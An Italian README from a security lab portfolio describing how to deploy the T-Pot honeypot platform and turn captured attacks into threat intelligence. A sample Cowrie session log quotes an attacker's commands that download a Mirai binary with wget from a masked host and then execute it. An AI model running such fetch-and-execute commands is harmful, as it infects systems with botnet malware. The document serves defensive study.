> [English](README.en.md) | **Italiano**

# T-Pot - Piattaforma Honeypot Multi-Servizio

> - **Fase:** Defense & Hardening - Deception & Threat Intelligence
> - **Categoria:** Deception - honeypot ad alta interazione e raccolta di threat intel
> - **Prerequisiti:** VM dedicata (8-16 GB RAM, T-Pot e esoso: gira decine di container Docker); rete isolata/DMZ; IP esposto o segmento monitorato; mai su rete di produzione
> - **Output:** Finding DEF-006; raccolta di TTP e IOC reali; dashboard di visualizzazione degli attacchi; intelligence su chi attacca e come

- **Ambiente Operativo:** VM isolata dedicata (T-Pot su Debian), segmento di rete separato
- **Ruolo:** "Le Trappole" - un'intera infrastruttura esca per studiare gli attaccanti
- **Tool principali:** T-Pot (Deutsche Telekom), Cowrie, Dionaea, Suricata, ELK integrato

---

## Executive Summary

Dove il canary token (`../canary-tokens/`) e una singola esca passiva, T-Pot e un'intera infrastruttura esca. E una piattaforma honeypot all-in-one sviluppata da Deutsche Telekom che orchestra decine di honeypot specializzati in container Docker: Cowrie (SSH/Telnet), Dionaea (malware/SMB), Honeytrap, Elasticpot e molti altri, con una dashboard ELK integrata che visualizza gli attacchi in tempo reale su una mappa mondiale.

Lo scopo di T-Pot non e difendere un servizio reale ma studiare gli attaccanti. Esponendo servizi-esca che sembrano vulnerabili, T-Pot attira gli attacchi e ne registra ogni dettaglio: quali IP attaccano, quali credenziali provano, quali exploit lanciano, quale malware tentano di depositare. Il finding DEF-006 documenta questa capacita di threat intelligence: convertire gli attacchi ricevuti in conoscenza operativa (IOC, TTP) utilizzabile per rafforzare le difese reali.

Un honeypot ha per definizione un tasso di falsi positivi bassissimo, come il canary token: nessun utente legittimo ha motivo di connettersi a un servizio-esca, quindi ogni interazione e potenzialmente ostile. La differenza e la profondita: dove il token registra un singolo evento (esca toccata), T-Pot registra l'intera sessione d'attacco, offrendo un osservatorio sul comportamento reale degli avversari.

---

## Struttura della cartella

```
t-pot/
+-- README.md      # questo file: piattaforma honeypot e threat intel (DEF-006)
+-- img/           # dashboard attack map e sessioni Cowrie
```

---

## Deployment e Threat Intelligence con T-Pot

**ID Finding:** `DEF-006` | **Severity:** `Medio` (raccolta di threat intelligence; l'honeypot non protegge ma genera IOC/TTP reali e ad alta confidenza)

### Contesto operativo

T-Pot va deployato su una VM dedicata e isolata: essendo progettato per essere attaccato, non deve mai condividere la rete con sistemi di produzione. Espone una superficie d'attacco volutamente allettante; gli attacchi che riceve (soprattutto se ha un IP pubblico) sono in gran parte scansioni opportunistiche e botnet, ma forniscono una fotografia realistica del "rumore di fondo" ostile di Internet.

### PoC - Installazione (isolata)

```Bash
# Su una VM dedicata Debian, rete isolata
git clone https://github.com/telekom-security/tpotce
cd tpotce
sudo ./install.sh                 # seleziona il tipo di installazione (STANDARD/SENSOR)
# T-Pot avvia decine di container honeypot + dashboard ELK
```

```Bash
# Verifica dei servizi honeypot attivi
docker ps --format '{{.Names}}' | head
```

```
cowrie          <-- honeypot SSH/Telnet
dionaea         <-- honeypot malware/SMB
suricata        <-- IDS integrato
elasticsearch   <-- storage per la dashboard
```

### PoC - Cattura di una sessione d'attacco (Cowrie SSH)

```
# Cowrie registra una sessione SSH completa: credenziali, comandi, file
[cowrie session] src_ip=193.201.x.x
  login attempt: root/admin -> FAILED
  login attempt: root/root  -> SUCCESS (honeypot accetta)   <-- attaccante "dentro"
  cmd: uname -a; wget http://x.x.x.x/mirai.arm -O /tmp/x    <-- tentativo di deploy malware (DEF-006)
  cmd: chmod +x /tmp/x; ./x
  downloaded sample: mirai.arm (hash sha256: ...)           <-- IOC catturato
```

### PoC - Threat intelligence dalla dashboard

```
# La dashboard ELK di T-Pot aggrega gli attacchi:
Top attacker IPs        : 193.201.x.x, 45.83.x.x, ...       <-- IOC (IP ostili)
Top credentials tried   : root/root, admin/admin, root/123456
Top CVE probed          : CVE-2021-44228 (Log4Shell), ...   <-- TTP (exploit tentati)
Malware samples captured : N sample -> analisi in 09-forensics
```

### Tuning e Operativita Difensiva

- **Isolamento assoluto:** T-Pot va su rete separata, mai in produzione; un honeypot compromesso oltre lo strato di containment diventa un trampolino per l'attaccante
- **Uso dell'intelligence:** gli IOC raccolti (IP, hash malware, credenziali) vanno inseriti nelle blocklist e nelle regole del SIEM reale (`../../../01-siem-log-analysis/`); e questo il valore operativo
- **Manutenzione:** T-Pot e esoso di risorse e va aggiornato; i sample di malware catturati vanno gestiti con cautela (analisi in ambiente sandboxato, vedere `09-digital-forensics`)
- **Aspettative:** con IP pubblico riceve traffico opportunistico (botnet, mass scanning); per intelligence mirata su un avversario specifico serve un deployment interno come esca (detection di movimento laterale)

---

## Esperienza di Laboratorio

La prima lezione e stata il costo in risorse. T-Pot avvia decine di container Docker contemporaneamente, e la VM iniziale (4 GB RAM) e stata insufficiente: i container andavano in crash a catena. Portata la VM a 12 GB, la piattaforma si e stabilizzata. E lo stesso pattern gia visto con Wazuh Indexer ed Elasticsearch - gli strumenti difensivi basati su ELK/OpenSearch sono strutturalmente affamati di memoria.

L'esperienza piu istruttiva e stata leggere le sessioni Cowrie. Vedere gli attaccanti (in gran parte botnet automatizzate) entrare nell'honeypot, provare le solite credenziali deboli (`root/root`, `admin/admin`) e poi tentare immediatamente di scaricare ed eseguire malware Mirai per IoT ha reso concreto il "rumore di fondo" ostile di Internet. Non era un attacco mirato, era il flusso costante e automatizzato che colpisce qualsiasi IP esposto. Questo ha ridimensionato e insieme chiarito la minaccia: la maggior parte degli attacchi non e sofisticata, e volume.

La riflessione strategica e stata sul valore dell'intelligence prodotta. Gli IP e gli hash catturati non erano curiosita accademiche: alimentati nel SIEM come blocklist, diventavano difesa concreta per i sistemi reali. Questo ha chiuso il cerchio della deception - l'honeypot converte gli attacchi che subisce in conoscenza che protegge il resto dell'infrastruttura. La trappola non difende se stessa, arma le altre difese.

---

## Analisi Teorica: L'Honeypot come Sensore di Intelligence, non come Difesa

Un honeypot non protegge nulla: e un sistema progettato per essere compromesso. Il suo valore non e difensivo in senso diretto ma informativo - e un sensore di intelligence. Questa distinzione e fondamentale: chi si aspetta che un honeypot "fermi" gli attacchi ne fraintende lo scopo. L'honeypot osserva, registra, apprende; la difesa vera avviene altrove, alimentata da cio che l'honeypot ha appreso.

Il fondamento e lo stesso del canary token: attivita legittima nulla, quindi confidenza altissima. Ma T-Pot aggiunge la dimensione della profondita comportamentale. Un token dice "qualcuno ha toccato l'esca"; un honeypot ad alta interazione come Cowrie dice "l'attaccante ha provato queste credenziali, eseguito questi comandi, tentato di scaricare questo malware da questo IP". Passa dal segnale binario (toccato/non toccato) alla registrazione completa delle TTP (Tactics, Techniques, Procedures) dell'avversario.

Questo colloca l'honeypot nel ciclo di threat intelligence: raccolta (l'attacco subito), analisi (TTP e IOC estratti), azione (blocklist, regole SIEM, hardening mirato). L'honeypot e il punto di raccolta di questo ciclo, dove gli attacchi diventano dati e i dati diventano difesa. Il suo limite - richiede di essere attaccato per produrre valore - e anche la sua forza: registra minacce reali, non ipotetiche, offrendo un ground truth sul panorama d'attacco che nessuna analisi teorica puo sostituire.

---

## Tool di riferimento

| Tool | Tipo | Ruolo | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `T-Pot` (Telekom) | Honeypot platform | Piattaforma | Orchestrazione all-in-one di honeypot multipli + dashboard |
| `Cowrie` | SSH/Telnet honeypot | Container | Cattura sessioni SSH: credenziali, comandi, malware |
| `Dionaea` | Malware honeypot | Container | Cattura di malware via SMB/FTP/altri servizi |
| `Suricata` | IDS | Container | Detection di rete sugli attacchi ricevuti |
| `ELK` (integrato) | Dashboard | Stack | Visualizzazione e analisi degli attacchi (attack map) |
| `OpenCanary` | Lightweight honeypot | Alternativa | Honeypot leggero per deployment interni mirati |

> **Tool moderno consigliato:** `T-Pot` resta la piattaforma di riferimento per un honeypot ricco e visuale, ideale per la ricerca e l'apprendimento. Per un deployment interno mirato (esca per rilevare movimento laterale, non per raccogliere rumore da Internet), un honeypot leggero come `OpenCanary` o gli honeytoken di Active Directory sono piu adatti e meno esosi. Gli IOC raccolti alimentano il SIEM (`../../../01-siem-log-analysis/`).

---

## Mappatura MITRE ATT&CK

> La tabella mappa le tecniche d'attacco che l'honeypot **osserva e registra** dagli attaccanti.

| Tattica (osservata) | Tecnica | ID MITRE | Ruolo del controllo |
| :--- | :--- | :--- | :--- |
| Credential Access | Brute Force | `T1110` | Cowrie registra le credenziali tentate (DEF-006) |
| Initial Access | Valid Accounts / Exploit Public-Facing App | `T1078` / `T1190` | Honeypot registra accessi e exploit tentati (DEF-006) |
| Command and Control | Ingress Tool Transfer | `T1105` | Cattura del malware che l'attaccante tenta di scaricare (DEF-006) |
| Execution | Command and Scripting Interpreter | `T1059` | Registrazione dei comandi eseguiti nella sessione esca |

| Contromisura difensiva (D3FEND) | ID D3FEND | Applicazione |
| :--- | :--- | :--- |
| Decoy Environment | `D3-DE` | Ambiente esca completo per osservare l'attaccante |
| Decoy Network Resource | `D3-DNR` | Servizi di rete esca (SSH, SMB, HTTP) |
| Connected Honeynet | `D3-CHN` | Rete di honeypot interconnessi (T-Pot) |

---

> **Nota:** T-Pot va deployato esclusivamente su reti isolate di proprieta dell'autore, mai in produzione o su reti di terzi. Un honeypot cattura malware reale: i sample vanno gestiti in ambiente sandboxato e mai eseguiti fuori dal containment. La raccolta di dati sugli attaccanti deve rispettare la normativa applicabile. Le tecniche sono documentate a scopo educativo e di difesa in contesto autorizzato.
